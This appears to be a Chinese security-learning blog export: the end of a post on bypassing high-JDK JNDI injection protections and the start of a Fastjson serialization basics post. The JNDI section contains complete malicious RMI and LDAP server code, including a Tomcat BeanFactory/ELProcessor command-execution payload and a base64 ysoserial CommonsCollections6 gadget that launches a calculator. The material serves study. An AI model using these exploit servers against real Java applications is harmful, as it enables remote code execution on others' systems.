<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419150850.png" ></p>
<p>后面就是多个dowhile语句，遍历获取ResourceRef实例addr属性的值，获取到addrType的值为x时退出当前循环，然后调用<code>getContent()</code>获取我们传进去的恶意表达式</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419151149.png" ></p>
<p>然后从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后带着这些参数走到invoke，实现反射调用执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419151404.png" ></p>
<p>还是好理解的，不能用远程的，那就找到一个本地的去用，但是服务端<code>resourceRef.add()</code>里面写的详细内容，说实话不是理解的很透彻，大概设计el表达式，这块现在还不太懂，可能后面学了再看会清晰很多，这里先留个钩子</p>
<p>这里服务端还有另一个写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIBypassHighJava</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( <span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;open&#x27;,&#x27;-a&#x27;,&#x27;Calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;[*]Evil command: calc&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要差别是这个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;open&#x27;,&#x27;-a&#x27;,&#x27;Calculator&#x27;]).start()\&quot;)&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>差不多也是反射调用命令执行，但是没有外层的eval也是没用，目前个人认为这个没有直接写Runtime方便</p>
<h4 id="利用LDAP返回序列化数据绕过"><a href="#利用LDAP返回序列化数据绕过" class="headerlink" title="利用LDAP返回序列化数据绕过"></a>利用LDAP返回序列化数据绕过</h4><p>LDAP服务端除了返回JNDI Reference这种方法之外，还可以通过返回序列化的对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</p>
<blockquote>
<p>如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 <code>obj.decodeObject()</code> 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。</p>
</blockquote>
<p>所以写一个ldap服务器，里面加入gadget内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:39876/#Evil&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">39654</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//低版本JDK</span></span><br><span class="line"><span class="comment">/*            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span><br><span class="line"><span class="comment">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span><br><span class="line"><span class="comment">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());*/</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//高版本JDK</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4A&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;GHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABJvcGVuIC1hIGNhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==&quot;</span>));</span><br><span class="line">          <span class="comment">// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 &#x27;open -a calculator&#x27;|base64 -w 0</span></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后客户端执行lookup也能弹计算机</p>
<p>这里有一款工具自动化很方便 <a class="link"   href="https://github.com/rebeyond/JNDInjector.git" >https://github.com/rebeyond/JNDInjector.git<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419163733.png" ></p>
<p>看一下代码，前面都是一样的，进入到<code>decodeObject()</code>-&gt;<code>getURLClassLoader()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419163953.png" ></p>
<p>里面依然有对trustURLCodebase的判断，结果是false</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419164103.png" ></p>
<p>但是回到decodeObject里面有一个<code>deserializeObject()</code>，里面有<code>readObejct()</code>就是用来反序列化的，而且我们也有了字节码，所以这样也能攻击成功。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419165024.png" ></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>【从文档开始的jndi注入之路-2 jndi+ldap绕过】<a class="link"   href="https://www.bilibili.com/video/BV1JY411F7mA?vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1JY411F7mA?vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/" >https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/bfengj/CTF/blob/main/Web/java/JNDI/%5BJava%E5%AE%89%E5%85%A8%5D%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.md" >https://github.com/bfengj/CTF/blob/main/Web/java/JNDI/%5BJava%E5%AE%89%E5%85%A8%5D%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.md<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h4><p>诶其实还有好多别的做法，现在先摸个皮毛，差不多了解这个思想，以后遇到更深的再接触</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Fastjson基础</title>
    <url>/2025/04/19/Java-Fastjson%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h3 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h3><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
<p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>
<p>Fastjson 源码地址：<a class="link"   href="https://github.com/alibaba/fastjson" >https://github.com/alibaba/fastjson<i class="fas fa-external-link-alt"></i></a></p>
<p>Fastjson 中文 Wiki：<a class="link"   href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN" >https://github.com/alibaba/fastjson/wiki/Quick-Start-CN<i class="fas fa-external-link-alt"></i></a></p>
<p>提供两个主要接口来分别实现序列化和反序列化操作。</p>
<p><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</p>
<p><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</p>
<p>能够把json理解成字符串</p>
<h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>简单看一下是怎么序列化反序列化的</p>
<p>先导入依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.2.24&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>先写一个human类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">human</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">human</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>写一个humanSerialize</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">human</span> <span class="variable">human</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">human</span>();</span><br><span class="line">        human.setName(<span class="string">&quot;Flow&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(human, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下个断点看这个过程</p>
<p>会先到JSON这个类，然后<code>toJSONString()</code>-&gt;<code>new SerializeWriter()</code>，序列化在这里完成的，里面定义了一些初值，赋值给 out 变量，这个 out 变量后续作为 <code>JSONSerializer</code> 类构造的参数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419174523.png" ></p>
<p>JSON里面有很多个static变量，其中就有一个<code>DEFAULT_TYPE_KEY</code>值为<code>@type</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250419174737.png" ></p>
<p>然后后面就是toString了，看一下运行结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;human&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Flow&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>代码重点在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(human, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure>

<p>主要是第二个参数，<code>SerializerFeature.WriteClassName</code>是 <code>JSON.toJSONString()</code> 里一个设置属性值，设置之后可以在后面序列化数据多加一个@type，也就是写上被序列化的类名，type可以指定反序列化的类，并调用<code>getter</code>&#x2F;<code>setter</code>&#x2F;<code>is</code> 方法。</p>
<blockquote>
<p>Fastjson 接受的 JSON 可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p>
</blockquote>
<p>没有设置<code>SerializerFeature.WriteClassName</code>是输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">0</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Flow&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">humanUnSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;human\&quot;,\&quot;age\&quot;:0,\&quot;name\&quot;:\&quot;Flow\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">human</span> <span class="variable">human</span> <span class="operator">=</span> JSON.parseObject(jsonString, human.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(human);</span><br><span class="line">        System.out.println(human.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果就这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">human@6659c656</span><br><span class="line">human</span><br></pre></td></tr></table></figure>

<p>大概就是这么用</p>
<h3 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h3><h4 id="反序列化时的-Feature-SupportNonPublicField-参数"><a href="#反序列化时的-Feature-SupportNonPublicField-参数" class="headerlink" title="反序列化时的 Feature.SupportNonPublicField 参数"></a>反序列化时的 Feature.SupportNonPublicField 参数</h4><p>前面示例中反序列化的时候没办法获取到age的值，因为他是private的，如果要还原出private属性的话，需要在<code>JSON.parseObject</code>&#x2F;<code>JSON.parse</code>中加上<strong>Feature.SupportNonPublicField</strong>参数</p>
<p>现在把human类里面的setAge函数注释掉，此时name是public，age是private，做一个对比</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">===没有Feature.SupportNonPublicField===</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">human@6659c656</span><br><span class="line">getName</span><br><span class="line">Flow</span><br><span class="line">getAge</span><br><span class="line">0</span><br><span class="line">====有Feature.SupportNonPublicField====</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">human@6659c656</span><br><span class="line">getName</span><br><span class="line">Flow</span><br><span class="line">getAge</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p>所以总的来说，把json传到JSON.parseObject()进行反序列化，如果要内容里面的私有变量被成功地还原出来，要加上<strong>Feature.SupportNonPublicField</strong>参数</p>
<h4 id="只进行-JSON-parseObject-jsonString"><a href="#只进行-JSON-parseObject-jsonString" class="headerlink" title="只进行 JSON.parseObject(jsonString)"></a>只进行 JSON.parseObject(jsonString)</h4><p>看一下parseObject()的指定或不指定对反序列化类型之间的差异</p>
<p>修改human类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法</p>
